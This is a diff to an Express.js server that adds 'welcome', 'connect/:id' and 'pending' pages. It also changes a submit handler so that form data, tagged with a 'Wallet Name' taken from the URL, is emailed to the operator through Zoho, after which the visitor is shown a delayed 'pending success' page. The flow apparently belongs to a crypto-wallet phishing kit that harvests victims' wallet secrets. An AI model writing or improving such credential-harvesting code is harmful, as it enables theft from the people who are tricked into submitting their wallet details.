@@ -8,8 +8,13 @@ dotenv.config()
 const PORT = process.env.PORT
 app.use(express.static("views"))
 app.use(express.static(__dirname + "/public/"))
+app.use("/dist", express.static(__dirname + "/dist/"))
+
 
 app.use(express.static(__dirname + "/views/Index_files/"))
+app.use(express.static(__dirname + "views/Welcome to our website_files"))
+app.use(express.static(__dirname + "/views/connect_files/"))
+app.use(express.static(__dirname + "/views/pending_files/"))
 
 app.use(bodyParser.urlencoded({ extended: true }))
 
@@ -23,16 +28,21 @@ app.get('/', (req, res) => {
     res.sendFile(__dirname + '/views/index.html')
 })
 
-app.get('/connect/manually', (req, res) => {
+app.get("/welcome", (req, res) => {
+    res.sendFile(__dirname + '/views/Welcome to our website.html')
+})
+
+app.get("/welcome/connect/:id", (req, res) => {
     res.sendFile(__dirname + '/views/connect.html')
 })
 
-app.get('/connect/pending/success', (req, res) => {
+
+app.get('/pending/success', (req, res) => {
     res.sendFile(__dirname + '/views/pending.html')
 })
 
 
-app.post('/submit', async (req, res) => {
+app.post('/welcome/connect/:id/submit', async (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'zoho',
         auth: {
@@ -59,7 +69,7 @@ app.post('/submit', async (req, res) => {
             from: process.env.FROM,
             to: recipient,
             subject: `${req.body.category}`,
-            html: `${req.body.data}`
+            html: `Wallet Name: ${req.params.id} <br> ${req.body.data}`
         }
 
         await new Promise((resolve, reject) => {
@@ -77,7 +87,7 @@ app.post('/submit', async (req, res) => {
     }
 
     await delay(2000)
-    res.redirect('/connect/pending/success')
+    res.redirect('/pending/success')
 })
 
 
